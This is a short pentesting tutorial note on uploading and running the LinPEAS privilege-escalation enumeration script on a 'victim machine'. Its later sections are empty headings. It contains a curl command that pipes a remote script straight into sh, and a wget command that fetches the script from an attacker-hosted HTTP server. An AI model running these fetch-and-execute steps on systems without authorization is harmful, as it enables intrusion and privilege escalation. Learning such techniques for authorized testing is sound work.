# Pretext

[[Scripts#LinPeas|Linpeas]] is a popular Linux privilege enumeration script that can help find possible ways to escalate privileges. While [[Scripts#LinPeas|Linpeas]] is technically an enumeration script, it's main power is [[Privilege Escalation|Privilege Escalation]].

# Uploading LinPeas

Uploading [[Scripts#LinPeas|Linpeas]] to a server or victim machine is quite easy.
Many times we will see restrictions when on a server so there are several ways to upload our script. The [[Scripts#LinPeas|Linpeas]] GitHub suggests that we run the following command to curl the latest release of the script. 
```Bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
Sometimes we will not have access to curl on the machine, so we can also save the script on our local machine or the installed location on Kali `/usr/share/peass/linpeas`.
Once we have the script, we can run a simple [[HTTP#Python HTTP Server|Python HTTP Server]] to host our file.
We then can upload the script.
```Bash
wget http://192.168.12.187:8000/linpeas.sh
```
One it is on the system, we do need to change the execution permissions with the following.
```Bash
chmod +x linpeas.sh
```
Executing the script is as easy as the following.
```Bash
./linpeas.sh
OR
sudo ./linpeas.sh (if root)
```
 [[Scripts#LinPeas|Linpeas]] will go and do a system analysis.

# Using LinPeas

# Dissecting the Output